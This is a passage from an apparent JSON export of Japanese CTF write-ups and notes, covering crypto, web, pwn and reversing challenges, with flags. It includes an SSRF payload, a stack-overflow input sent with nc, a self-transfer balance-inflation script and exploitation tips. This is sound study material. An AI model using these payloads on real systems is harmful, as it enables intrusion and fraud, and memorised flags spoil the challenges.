one-p-rsa\ncategory: crypto\ngenre: rsa\ndifficulty: easy\ntags:\n  - one-prime-rsa\n  - fermat\n  - phi\nsource: alpacahack:one-p-rsa\nsolved_at: 2026-05-29\n---\n\n# one-p-rsa\n\n## 問題の要点\n\n- 通常の RSA と違い、modulus が `n = p` の1素数だけ。\n- `ct = m^e mod p` が与えられる。\n\n## 解き方\n\n素数 `p` に対して `phi(p) = p - 1` なので、`d = e^-1 mod (p - 1)` を計算して復号する。\n\n```python\nd = pow(e, -1, p - 1)\nm = pow(ct, d, p)\nprint(long_to_bytes(m))\n```\n\n## 得られた flag\n\n```text\nAlpaca{which_rsa_do_you_like?}\n```\n\n## 知見\n\n- RSA の式は `pq` でなくても、群の位数に対する逆元が取れれば戻せる。\n- ただし1素数 modulus は factorization 以前に `phi` が即座に分かるので、秘密鍵が作れてしまう。\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n", "y": 2705.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w53/1231_108.md", "rel_path": "writeup/alphahack/2025-w53/1231_108.md", "kind": "writeup", "title": "\"108\"", "meta": {"title": "\"108\"", "category": "misc", "genre": "web-observation", "difficulty": "easy", "tags": ["cookie", "browser-state", "observation"], "source": "alpacahack:108", "solved_at": "2026-05-29"}, "links": ["insights/misc.md", "relations/misc.md"], "markdown": "---\ntitle: \"108\"\ncategory: misc\ngenre: web-observation\ndifficulty: easy\ntags:\n  - cookie\n  - browser-state\n  - observation\nsource: alpacahack:108\nsolved_at: 2026-05-29\n---\n\n# 108\n\n## 問題の要点\n\n- 説明文は `quiet, calming tradition`。\n- challenge server を見ると、flag が Cookie に入っている。\n\n## 解き方\n\nブラウザの DevTools、または HTTP レスポンス/リクエストの Cookie を確認する。\n\n```text\nCookie: ...\n```\n\n## 知見\n\n- Misc/Web の easy 問では、HTML 本文だけでなく Cookie、localStorage、sessionStorage、response headers を見る。\n- 「静かな」「見るだけ」の問題文は、状態保存やメタデータの観察を示唆していることがある。\n\n## 連携する知見\n\n- [Misc](../../../insights/misc.md)\n- [Misc relations](../../../relations/misc.md)\n", "y": 282.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w53/1230_rbg.md", "rel_path": "writeup/alphahack/2025-w53/1230_rbg.md", "kind": "writeup", "title": "RBG", "meta": {"title": "RBG", "category": "crypto", "genre": "rsa-lcg", "difficulty": "very-hard", "tags": ["rsa", "lcg", "exponent-relation", "modular-equations"], "source": "alpacahack:rbg", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: RBG\ncategory: crypto\ngenre: rsa-lcg\ndifficulty: very-hard\ntags:\n  - rsa\n  - lcg\n  - exponent-relation\n  - modular-equations\nsource: alpacahack:rbg\nsolved_at: 2026-05-29\n---\n\n# RBG\n\n## 問題の要点\n\n- 同じ `m, N` に対して、指数 `e_i` を LCG `e_{i+1} = 3e_i + 1337 mod N` で更新し、`c_i = m^{e_i} mod N` を 13 個出力する。\n- `N` は 137-bit prime 2個の積で、`e_i` は不明。\n\n## 解き方\n\n隣り合う暗号文の関係を見る。\n\n```text\nc_{i+1} = m^{e_{i+1}}\n        = m^{3e_i + 1337 - k_i N}\n        = c_i^3 * m^1337 * (m^N)^(-k_i)  mod N\n```\n\nここで `X = m^1337`, `Y = m^N` と置くと、\n\n```text\nA_i = c_{i+1} * c_i^(-3) = X * Y^(-k_i)\n```\n\n`k_i` は `0..3` 程度に限られる。候補から `X, Y` を復元し、`X^N == Y^1337` で整合性を確認する。\n最後に `1337a + Nb = 1` を満たす `a, b` を拡張 Euclid で取り、\n\n```text\nm = X^a * Y^b mod N\n```\n\nを計算する。\n\n## 得られた flag\n\n```text\nAlpaca{Thanks_SuperBeetleGamer!}\n```\n\n## 知見\n\n- RSA は指数が未知でも、指数同士に線形関係があると暗号文比から情報が出る。\n- LCG の `mod N` による carry `k_i` は小さい範囲に落ちることがあり、総当たり対象にできる。\n- 同じ base `m` の複数冪が得られたら、指数の一次結合で `m^1` を作れるかを見る。\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n", "y": 2990.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1207_size-limit.md", "rel_path": "writeup/alphahack/2025-w49/1207_size-limit.md", "kind": "writeup", "title": "size-limit", "meta": {"title": "size-limit", "category": "crypto", "genre": "rsa", "difficulty": "medium", "tags": ["raw-rsa", "leaked-d", "oversized-plaintext", "size-limit"], "source": "size-limit/size-limit/problem.py", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: size-limit\ncategory: crypto\ngenre: rsa\ndifficulty: medium\ntags:\n  - raw-rsa\n  - leaked-d\n  - oversized-plaintext\n  - size-limit\nsource: size-limit/size-limit/problem.py\nsolved_at: 2026-05-29\n---\n\n# size-limit\n\n## 問題の要点\n\n- `N`, `e`, `c`, `d` が出力される。\n- flag の長さは 131 bytes で、1024-bit modulus より大きい。\n- つまり、暗号化は raw RSA でも平文をそのまま保持できない。\n\n## 解き方の知見\n\n1. まず `m = pow(c, d, N)` を計算して residue を得る。\n2. これは元の flag ではなく、`flag mod N` に相当する。\n3. 元の flag は `m + kN` の形なので、長さや文字種、既知の prefix で候補を絞る。\n\n今回の flag 長は 131 bytes なので、候補 `k` は\n`2^(8*130) <= m + kN < 2^(8*131)` で絞れる。\nさらに mirror 元の flag format は `TSGLIVE{...}` なので、prefix 範囲に入るものを探す。\n\n見つかった `k` は `15128635`。\n\n```text\nTSGLIVE{Tttthhhhhiiiiiiisssss iiiiiiiiiisssss aaaaaaaaaaaaaa tooooooooooooooooooooo looooooooooooooooong fllllaaaaaaaaaaaaaaaaaag!}\n```\n\n## 使いどころ\n\n- `d` が漏れている raw RSA 問題\n- 平文サイズが modulus を超える問題\n- 既知フォーマットがあり、lift で復元する問題\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n\n## メモ\n\nこの手の問題は「復号できるか」ではなく、「復号結果から元の平文をどう lift するか」が本題になる。\n", "y": 3987.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1203_emojify.md", "rel_path": "writeup/alphahack/2025-w49/1203_emojify.md", "kind": "writeup", "title": "Emojify", "meta": {"title": "Emojify", "category": "web", "genre": "server-side", "difficulty": "medium", "tags": ["ssrf", "url-parser", "scheme-relative-url", "docker-network"], "source": "emojify/frontend/index.js", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: Emojify\ncategory: web\ngenre: server-side\ndifficulty: medium\ntags:\n  - ssrf\n  - url-parser\n  - scheme-relative-url\n  - docker-network\nsource: emojify/frontend/index.js\nsolved_at: 2026-05-29\n---\n\n# Emojify\n\n## 問題の要点\n\nfrontend の `/api` は `path` を WAF に通してから、固定 base つきの `new URL()` で fetch する。\n\n```js\nif (!path.startsWith(\"/\")) throw new Error(\"Invalid 1\");\nif (!path.includes(\"emoji\")) throw new Error(\"Invalid 2\");\n\nconst url = new URL(path, \"http://backend:3000\");\nconst emoji = await fetch(url).then((r) => r.text());\n```\n\nsecret service は Docker 内の `http://secret:1337/flag`。\n\n## 解き方\n\n`new URL()` は `//host/path` を scheme-relative URL として解釈する。\nつまり `path` が `/` で始まっていても host を差し替えられる。\n\npayload:\n\n```text\n/api?path=//secret:1337/flag?emoji\n```\n\n`//secret:1337/flag?emoji` は `startsWith(\"/\")` と `includes(\"emoji\")` を満たし、\nfetch 先は `http://secret:1337/flag?emoji` になる。\n`/flag` は query を見ないため flag が返る。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 1422.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1202_a-fact-of-ctf.md", "rel_path": "writeup/alphahack/2025-w49/1202_a-fact-of-ctf.md", "kind": "writeup", "title": "a fact of CTF", "meta": {"title": "a fact of CTF", "category": "crypto", "genre": "integer-factorization", "difficulty": "easy", "tags": ["prime-factorization", "unique-factorization", "ascii-exponents"], "source": "a-fact-of-CTF/chall.py", "solved_at": "2026-05-29"}, "links": ["insights/crypto.md", "relations/crypto.md"], "markdown": "---\ntitle: a fact of CTF\ncategory: crypto\ngenre: integer-factorization\ndifficulty: easy\ntags:\n  - prime-factorization\n  - unique-factorization\n  - ascii-exponents\nsource: a-fact-of-CTF/chall.py\nsolved_at: 2026-05-29\n---\n\n# a fact of CTF\n\n## 問題の要点\n\nflag の i 文字目を `ord(c)` として、i 番目の素数をその指数だけ掛けている。\n\n```python\nct *= primes[i] ** (ord(c))\n```\n\n素因数分解の一意性により、暗号文の各素因数の指数がそのまま文字コードになる。\n\n## 解き方\n\n```python\nct = int(open(\"output.txt\").read().strip(), 16)\nflag = []\nfor p in primes:\n    e = 0\n    while ct % p == 0:\n        ct //= p\n        e += 1\n    if e:\n        flag.append(chr(e))\nprint(\"\".join(flag))\n```\n\nflag:\n\n```text\nAlpaca{prime_factorization_solves_everything}\n```\n\n## 連携する知見\n\n- [Crypto](../../../insights/crypto.md)\n- [Crypto relations](../../../relations/crypto.md)\n", "y": 425.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1206_simpleoverflow.md", "rel_path": "writeup/alphahack/2025-w49/1206_simpleoverflow.md", "kind": "writeup", "title": "simpleoverflow", "meta": {"title": "simpleoverflow", "category": "pwn", "genre": "stack-overflow", "difficulty": "easy", "tags": ["adjacent-variable-overwrite", "read-overflow", "stack"], "source": "simpleoverflow/src.c", "solved_at": "2026-05-29"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: simpleoverflow\ncategory: pwn\ngenre: stack-overflow\ndifficulty: easy\ntags:\n  - adjacent-variable-overwrite\n  - read-overflow\n  - stack\nsource: simpleoverflow/src.c\nsolved_at: 2026-05-29\n---\n\n# simpleoverflow\n\n## 問題の要点\n\n`buf` は 10 bytes だが、`read(0, buf, 0x10)` で 16 bytes 読む。\n隣接する `is_admin` を非 0 にできれば flag 表示分岐に入る。\n\n```c\nchar buf[10] = {0};\nint is_admin = 0;\nread(0, buf, 0x10);\n```\n\n## 解き方\n\npayload:\n\n```python\npayload = b\"A\" * 10 + b\"\\x01\\x00\\x00\\x00\"\n```\n\nremote では標準入力にこの payload を送る。\n\n```sh\npython3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*10 + b\"\\x01\\x00\\x00\\x00\")' | nc HOST PORT\n```\n\n`is_admin != 0` になり、`/bin/cat ./flag.txt` が実行される。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 3702.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1204_leaked-flag-checker.md", "rel_path": "writeup/alphahack/2025-w49/1204_leaked-flag-checker.md", "kind": "writeup", "title": "Leaked Flag Checker", "meta": {"title": "Leaked Flag Checker", "category": "rev", "genre": "flag-checker", "difficulty": "easy", "tags": ["xor", "stack-immediate", "binary-analysis"], "source": "leaked-flag-checker/challenge", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Leaked Flag Checker\ncategory: rev\ngenre: flag-checker\ndifficulty: easy\ntags:\n  - xor\n  - stack-immediate\n  - binary-analysis\nsource: leaked-flag-checker/challenge\nsolved_at: 2026-05-29\n---\n\n# Leaked Flag Checker\n\n## 問題の要点\n\nソースでは `xor_flag` が `REDACTED` だが、バイナリには比較対象が残っている。\n`main` を逆アセンブルすると、stack 上に即値で比較文字列を作ってから、\n入力の各 byte を `0x07` と xor して比較している。\n\n比較対象:\n\n```text\n46 6b 77 66 64 66 7c 6b 72 64 6c 7e 7a\n```\n\n## 解き方\n\n```python\nxor_flag = bytes.fromhex(\"466b776664667c6b72646c7e7a\")\nprint(bytes(b ^ 7 for b in xor_flag).decode())\n```\n\nflag:\n\n```text\nAlpaca{lucky}\n```\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 2135.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1201_alpacahack-2100.md", "rel_path": "writeup/alphahack/2025-w49/1201_alpacahack-2100.md", "kind": "writeup", "title": "AlpacaHack 2100", "meta": {"title": "AlpacaHack 2100", "category": "misc", "genre": "welcome", "difficulty": "welcome", "tags": ["daily-calendar", "flag-fragments", "future-month"], "source": "https://alpacahack.com/daily/challenges/alpacahack-2100", "solved_at": "2026-05-29"}, "links": ["insights/misc.md", "relations/misc.md"], "markdown": "---\ntitle: AlpacaHack 2100\ncategory: misc\ngenre: welcome\ndifficulty: welcome\ntags:\n  - daily-calendar\n  - flag-fragments\n  - future-month\nsource: https://alpacahack.com/daily/challenges/alpacahack-2100\nsolved_at: 2026-05-29\n---\n\n# AlpacaHack 2100\n\n## 問題の要点\n\n- Welcome 問題。\n- チャレンジページだけでなく、Daily AlpacaHack のカレンダー表示が入力になる。\n- `2100-01` の予定トピックに flag 片が隠れている。\n\n## 解き方\n\n`https://alpacahack.com/daily?month=2100-01` を見ると、1/11 から 1/17 に\n`Flag` カテゴリの planned topic が並ぶ。\n\n```text\nAlpaca{\nbrought_AGI_\nto_humanity...\n_yes,_Alpaca\n_Gentle_\nIntelligence\n.}\n```\n\n順番に連結して flag は次の通り。\n\n```text\nAlpaca{brought_AGI_to_humanity..._yes,_Alpaca_Gentle_Intelligence.}\n```\n\n## 連携する知見\n\n- [Misc](../../../insights/misc.md)\n- [Misc relations](../../../relations/misc.md)\n", "y": 852.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w49/1205_integer-writer.md", "rel_path": "writeup/alphahack/2025-w49/1205_integer-writer.md", "kind": "writeup", "title": "Integer Writer", "meta": {"title": "Integer Writer", "category": "pwn", "genre": "out-of-bounds-write", "difficulty": "hard", "tags": ["stack", "arbitrary-index", "return-address", "mitigation-check"], "source": "integer-writer/main.c", "solved_at": "2026-05-29", "status": "investigated"}, "links": ["insights/pwn.md", "relations/pwn.md"], "markdown": "---\ntitle: Integer Writer\ncategory: pwn\ngenre: out-of-bounds-write\ndifficulty: hard\ntags:\n  - stack\n  - arbitrary-index\n  - return-address\n  - mitigation-check\nsource: integer-writer/main.c\nsolved_at: 2026-05-29\nstatus: investigated\n---\n\n# Integer Writer\n\n## 問題の要点\n\n`pos` を受け取り、`integers[pos]` に `int` を 1 回だけ書ける。\n\n```c\nint integers[100], pos;\n\nscanf(\"%d\", &pos);\nif (pos >= 100) {\n    puts(\"You're a hacker!\");\n    return 1;\n}\nscanf(\"%d\", &integers[pos]);\n```\n\n`win()` は `0x4011d6`。\n\n## 調査結果\n\n手元の Linux x86_64 バイナリでは、`pos` は `[rbp-0x1a4]`、\n`integers[0]` は `[rbp-0x1a0]` にある。\nreturn address は `[rbp+0x8]` なので、差は `0x1a8 = 424` bytes。\n`int` 配列の index にすると `424 / 4 = 106`。\n\n意図解は `pos = 106`、`val = 0x4011d6` で return address の下位 4 bytes を\n`win()` に変えることだと思われる。\n\nただし手元バイナリでは `pos >= 100` により `106` が弾かれる。\n負の index は通るが、`integers[0]` より低いアドレス側へ進むため return address には届かない。\nUbuntu 24.04 Docker 上でも `106` は拒否されることを確認した。\n\n## 連携する知見\n\n- [Pwn](../../../insights/pwn.md)\n- [Pwn relations](../../../relations/pwn.md)\n", "y": 1992.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1210_read-assembly.md", "rel_path": "writeup/alphahack/2025-w50/1210_read-assembly.md", "kind": "writeup", "title": "Read Assembly", "meta": {"title": "Read Assembly", "category": "rev", "genre": "assembly", "difficulty": "medium", "tags": ["aarch64", "control-flow", "fibonacci"], "source": "alpacahack:read-assembly", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Read Assembly\ncategory: rev\ngenre: assembly\ndifficulty: medium\ntags:\n  - aarch64\n  - control-flow\n  - fibonacci\nsource: alpacahack:read-assembly\nsolved_at: 2026-05-29\n---\n\n# Read Assembly\n\n## 問題の要点\n\n- AArch64 の短い assembly を読み、最終的に出力される値を flag に入れる。\n- レジスタ更新と分岐だけで構成されるため、C に写経すると意味が見える。\n\n## 解き方\n\nレジスタを変数に写してループを再現する。\n\n```c\nint w0 = 0, w1 = 0, w4 = 1, w2 = 0, w3 = 0;\nwhile (1) {\n    w3 = w2 + w4;\n    if ((w1 & 1) == 0) {\n        w0 += w3;\n        w1++;\n    }\n    w1++;\n    if (w1 == 0x28) break;\n    w4 = w2;\n    w2 = w3;\n}\nprintf(\"%d\\n\", w0);\n```\n\nフィボナッチ数列に関係する値の和になり、答えは `102334155`。\n\n## 得られた flag\n\n```text\nAlpaca{102334155}\n```\n\n## 知見\n\n- assembly rev は「命令名を全部覚える」より、レジスタ更新を高級言語に戻すのが速い。\n- ループ変数、状態変数、条件分岐を分けると数列や checksum が見えやすい。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 3132.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1211_alpaca-bank.md", "rel_path": "writeup/alphahack/2025-w50/1211_alpaca-bank.md", "kind": "writeup", "title": "Alpaca Bank", "meta": {"title": "Alpaca Bank", "category": "web", "genre": "logic-bug", "difficulty": "medium", "tags": ["self-transfer", "business-logic", "balance-inflation"], "source": "alpacahack:alpaca-bank", "solved_at": "2026-05-29"}, "links": ["insights/web.md", "relations/web.md"], "markdown": "---\ntitle: Alpaca Bank\ncategory: web\ngenre: logic-bug\ndifficulty: medium\ntags:\n  - self-transfer\n  - business-logic\n  - balance-inflation\nsource: alpacahack:alpaca-bank\nsolved_at: 2026-05-29\n---\n\n# Alpaca Bank\n\n## 問題の要点\n\n- `/api/register` でユーザーを作り、`/api/transfer` で送金できる。\n- `fromUser == toUser` のケースで残高更新が壊れ、自己送金で残高が増える。\n\n## 解き方\n\n同じユーザーを送金元・送金先にして、金額を増やしながら transfer を繰り返す。\n\n```python\nuid = requests.post(f\"{BASE}/api/register\").json()[\"user\"]\namount = 10\nwhile amount < 1_000_000_000_000:\n    requests.post(\n        f\"{BASE}/api/transfer\",\n        json={\"fromUser\": uid, \"toUser\": uid, \"amount\": amount},\n    )\n    amount *= 2\n\nprint(requests.get(f\"{BASE}/api/user/{uid}\").json()[\"flag\"])\n```\n\n## 得られた flag\n\n```text\nAlpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}\n```\n\n## 知見\n\n- Web の資産系問題では、認証や SQLi より先に「同一ユーザー」「負数」「二重実行」「境界金額」を疑う。\n- 自己送金は差し引きゼロで終わるべきだが、実装順序によっては足し込みが二重化する。\n\n## 連携する知見\n\n- [Web](../../../insights/web.md)\n- [Web relations](../../../relations/web.md)\n", "y": 710.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1208_fully-padded-rsa.md", "rel_path": "writeup/alphahack/2025-w50/1208_fully-padded-rsa.md", "kind": "writeup", "title": "Fully Padded RSA", "meta": {"title": "Fully Padded RSA", "category": "crypto", "genre": "rsa", "difficulty": "hard", "tags": ["common-modulus", "small-root", "coppersmith", "deterministic-padding"], "source": "alpacahack:fully-padded-rsa", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: Fully Padded RSA\ncategory: crypto\ngenre: rsa\ndifficulty: hard\ntags:\n  - common-modulus\n  - small-root\n  - coppersmith\n  - deterministic-padding\nsource: alpacahack:fully-padded-rsa\nsolved_at: 2026-05-29\n---\n\n# Fully Padded RSA\n\n## 問題の要点\n\n- 同じ modulus `n` と同じ padded message に対して、異なる指数 `e1 = 65517`, `e2 = 65577` で暗号化した `c1`, `c2` が与えられる。\n- `gcd(e1, e2) = 3` なので、common modulus attack をそのまま使っても `m` ではなく `m^3 mod n` が得られる。\n- padding はランダムではなく、上位側がおおむね `n` 由来で、下位側に短い flag が入る形。\n\n## 解き方\n\n1. 拡張 Euclid で `s, t` を取り、`c1^s * c2^t mod n = m^3 mod n` を得る。\n2. flag 長を仮定し、上位既知部分を `prefix = (n >> (8 * len)) << (8 * len)` と置く。\n3. `m = prefix + x` と見て、`(prefix + x)^3 - m3 == 0 mod n` の小さい根 `x` を探す。\n4. `x < n^(1/3)` に収まるので Coppersmith small roots が使える。\n\n## 使う形\n\n```python\ng, s, t = xgcd(e1, e2)\nm3 = pow(c1, s, n) * pow(c2, t, n) % n\n\nfor flag_len in range(len(\"Alpaca{}\"), 41):\n    shift = flag_len * 8\n    prefix = (n >> shift) << shift\n    # find small root x of (prefix + x)^g - m3 mod n\n```\n\n## 得られた flag\n\n```text\nAlpaca{p4dd1n6_mu57_u53_r4nd0m_v41u3s}\n```\n\n## 知見\n\n- common modulus attack で指数の gcd が 1 でない場合、`m^g` が残る。\n- padding が deterministic で未知部分が小さいなら、`m^g` から small root に持ち込める。\n- 「RSA の padding」は単に埋めれば安全ではなく、乱数性と検証不能性が重要。\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n", "y": 1707.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1213_safe-prime.md", "rel_path": "writeup/alphahack/2025-w50/1213_safe-prime.md", "kind": "writeup", "title": "Safe Prime", "meta": {"title": "Safe Prime", "category": "crypto", "genre": "rsa", "difficulty": "medium", "tags": ["related-primes", "safe-prime", "factorization"], "source": "alpacahack:safe-prime", "solved_at": "2026-05-29"}, "links": ["insights/rsa.md", "relations/rsa.md"], "markdown": "---\ntitle: Safe Prime\ncategory: crypto\ngenre: rsa\ndifficulty: medium\ntags:\n  - related-primes\n  - safe-prime\n  - factorization\nsource: alpacahack:safe-prime\nsolved_at: 2026-05-29\n---\n\n# Safe Prime\n\n## 問題の要点\n\n- RSA modulus が `n = p * q` で、`q = 2p + 1` の safe prime 構造になっている。\n- つまり `n = p(2p + 1) = 2p^2 + p`。\n\n## 解き方\n\n二次方程式として `p` を復元する。\n\n```python\n# 2p^2 + p - n = 0\np = (-1 + isqrt(1 + 8*n)) // 4\nq = 2*p + 1\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n```\n\n## 得られた flag\n\n```text\nctf4b{R3l4ted_pr1m3s_4re_vuLner4ble_n0_maTt3r_h0W_l4rGe_p_1s}\n```\n\n## 知見\n\n- safe prime 自体は危険ではないが、`p` と `q` の関係をそのまま公開 modulus に持ち込むと factorization が二次方程式になる。\n- RSA では「素数が大きい」より「独立に生成されている」ことが重要。\n\n## 連携する知見\n\n- [RSA](../../../insights/rsa.md)\n- [RSA relations](../../../relations/rsa.md)\n", "y": 3560.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1209_hit-and-miss.md", "rel_path": "writeup/alphahack/2025-w50/1209_hit-and-miss.md", "kind": "writeup", "title": "hit-and-miss", "meta": {"title": "hit-and-miss", "category": "misc", "genre": "oracle", "difficulty": "easy", "tags": ["regex-oracle", "prefix-leak", "brute-force"], "source": "alpacahack:hit-and-miss", "solved_at": "2026-05-29"}, "links": ["insights/misc.md", "relations/misc.md"], "markdown": "---\ntitle: hit-and-miss\ncategory: misc\ngenre: oracle\ndifficulty: easy\ntags:\n  - regex-oracle\n  - prefix-leak\n  - brute-force\nsource: alpacahack:hit-and-miss\nsolved_at: 2026-05-29\n---\n\n# hit-and-miss\n\n## 問題の要点\n\n- サーバーに regex を送ると、secret flag にマッチしたかどうかが `Hit!` / `Miss!` で返る。\n- 試行回数の制限が実質ない。\n\n## 解き方\n\n`^Alpaca\\{...` のように prefix 固定の正規表現を投げ、1文字ずつ候補を伸ばす。\n\n```python\nchars = string.ascii_letters + string.digits + \"_}\"\nflag = r\"Alpaca\\{\"\n\nwhile True:\n    for ch in chars:\n        pattern = f\"^{flag}{re.escape(ch)}\"\n        if is_hit(pattern):\n            flag += r\"\\}\" if ch == \"}\" else ch\n            break\n```\n\n文字クラス `[...]` を使えば二分探索もできる。\n\n## 得られた flag\n\n```text\nAlpaca{Reg3x_Crossw0rd}\n```\n\n## 知見\n\n- yes/no oracle は、暗号でなくても secret extraction になる。\n- regex を受け取るサービスでは、完全一致だけでなく prefix match や文字クラスによる探索が情報漏えいになる。\n\n## 連携する知見\n\n- [Misc](../../../insights/misc.md)\n- [Misc relations](../../../relations/misc.md)\n", "y": 1850.0, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1214_power-obfus-royalty.md", "rel_path": "writeup/alphahack/2025-w50/1214_power-obfus-royalty.md", "kind": "writeup", "title": "power_obfus_royalty", "meta": {"title": "power_obfus_royalty", "category": "rev", "genre": "powershell", "difficulty": "medium", "tags": ["powershell", "obfuscation", "deobfuscation"], "source": "alpacahack:power-obfus-royalty", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: power_obfus_royalty\ncategory: rev\ngenre: powershell\ndifficulty: medium\ntags:\n  - powershell\n  - obfuscation\n  - deobfuscation\nsource: alpacahack:power-obfus-royalty\nsolved_at: 2026-05-29\n---\n\n# power_obfus_royalty\n\n## 問題の要点\n\n- PowerShell の難読化コードを読む問題。\n- Invoke-Expression、文字列結合、エンコード/デコードの層を剥がす。\n\n## 解き方\n\n1. 実行される文字列を直接実行せず、出力するように置き換える。\n2. Base64、文字列 reverse、置換などの変換を CyberChef や手元スクリプトで剥がす。\n3. 最終的に出てくる flag 文字列を読む。\n\n## 得られた flag\n\n```text\nTSGLIVE{1nv0k3_3xpr35510n_15_an_1mp0r7an7_f3a7ur3_f0r_p0w3r5h3ll_0bfu5ca710n}\n```\n\n## 知見\n\n- 難読化 rev は、まず「実行される文字列」を表示に変える。\n- PowerShell の `Invoke-Expression` は eval 相当なので、そこに渡る直前の値が主戦場。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 2847.5, "degree": 3, "displayLabel": ""}, {"id": "writeup/alphahack/2025-w50/1212_sugoi-flag-checker.md", "rel_path": "writeup/alphahack/2025-w50/1212_sugoi-flag-checker.md", "kind": "writeup", "title": "Sugoi Flag Checker", "meta": {"title": "Sugoi Flag Checker", "category": "rev", "genre": "flag-checker", "difficulty": "hard", "tags": ["strcmp", "breakpoint", "dynamic-analysis"], "source": "alpacahack:sugoi-flag-checker", "solved_at": "2026-05-29"}, "links": ["insights/rev.md", "relations/rev.md"], "markdown": "---\ntitle: Sugoi Flag Checker\ncategory: rev\ngenre: flag-checker\ndifficulty: hard\ntags:\n  - strcmp\n  - breakpoint\n  - dynamic-analysis\nsource: alpacahack:sugoi-flag-checker\nsolved_at: 2026-05-29\n---\n\n# Sugoi Flag Checker\n\n## 問題の要点\n\n- 複雑そうに見える ELF の flag checker。\n- 実際には最終的に入力文字列と平文 flag 候補が `strcmp` で比較される。\n\n## 解き方\n\nGhidra で比較箇所を見つけ、`strcmp` 呼び出し直前に breakpoint を置く。\n\n```gdb\nb *main+321\nr\n# dummy input を入れる\n# strcmp(s1=input, s2=expected) の s2 を読む\n```\n\n`strcmp` の第2引数に平文の期待値が載っていた。\n\n## 得られた flag\n\n```text\nAlpaca{m3ccha_rand0m_5b0x_d4yo!}\n```\n\n## 知見\n\n- checker が複雑でも、最後の比較が平文なら復号ロジックを全部読む必要はない。\n- `strcmp`, `memcmp`, `strncmp` の直前は、動的解析で最優先に見る場所。\n\n## 連携する知見\n\n- [Rev](../../../insights/rev.md)\n- [Rev relations](../../../relations/rev.md)\n", "y": 4130.0, "degree": 3, "displayLabel": ""}, {"id": "insights/pwn.md", "rel_path": "insights/pwn.md", "kind": "insights", "title": "Pwn", "meta": {}, "links": [], "markdown": "# Pwn\n\nPwn は「どこに書けるか」「何を読めるか」「制御フローに届くか」を分解して考える。\nCTF の小問では、保護機構を全部突破するより、用意された1つのズレを正しく exploit primitive に変換することが多い。\n\n## 初動\n\n- `checksec` で Canary, PIE, NX, RELRO を見る。\n- 入力関数を見る: `gets`, `scanf(\"%s\")`, `read`, `fgets` のサイズ。\n- 書き込み先を見る: stack, heap, global, 配列 index, format string。\n- 到達目標を見る: `win`, flag read, secret compare, function pointer, return address。\n\n## 壊れやすい部分\n\n- **境界チェックの片側欠落**: 上限だけ見て下限を見ないと負 index OOB。\n- **隣接変数 overwrite**: 小さい overflow でも admin flag や secret を書ける。\n- **format string**: `printf(user_input)` は leak/write の両方になる。追加引数があると短い payload でも強い。\n- **Use-After-Free**: `free` 後に NULL 化しない pointer は、同サイズ再確保で別オブジェクトを読む/書く。\n- **global buffer overflow**: ランダム secret でも secret 自体を書き換えられるなら leak 不要。\n- **ret2win**: PIE 無効なら固定アドレスへ return address を上書きするだけでよい。\n\n## 考え方\n\n1. バグを primitive に言い換える: arbitrary write, partial overwrite, read primitive, control-flow hijack。\n2. primitive の届く範囲を測る: offset、要素サイズ、符号、アラインメント。\n3. 保護機構を避ける: OOB で return address へ直接書く、secret を壊す、同じ chunk を再利用する。\n4. 入力制約を exploit に反映する: 文字数、NUL、改行、整数範囲、format string の出力文字数。\n\n## 実戦メモ\n\n- Canary があっても、return address へ直接 OOB write できるなら Canary を踏まない。\n- `strcmp` は NUL で終わる。NUL overwrite は認証系で強い。\n- heap 入門問では、まず「free 後に同サイズ allocate で同じアドレスになるか」を確認する。\n", "y": 2094.285714285714, "degree": 7, "displayLabel": "pwn"}, {"id": 